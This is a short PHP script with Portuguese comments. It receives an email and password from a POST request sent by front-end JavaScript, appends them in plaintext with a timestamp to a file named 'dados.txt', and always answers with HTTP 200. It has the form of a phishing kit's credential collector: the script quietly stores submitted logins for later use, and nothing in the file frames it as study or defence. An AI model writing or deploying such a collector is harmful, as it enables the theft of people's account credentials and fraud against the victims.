<?php
/* ---- PEGA O QUE CHEGOU ---- */
$email = $_POST['e'] ?? '';
$pass  = $_POST['p'] ?? '';

/* ---- GRAVA SE NÃO FOR VAZIO ---- */
if ($email && $pass) {
    $line = date("Y-m-d H:i:s") . " | $email | $pass" . PHP_EOL;
    file_put_contents('dados.txt', $line, FILE_APPEND | LOCK_EX);
}

/* ---- DEVOLVE 200 PARA O JAVASCRIPT ---- */
http_response_code(200);
?>
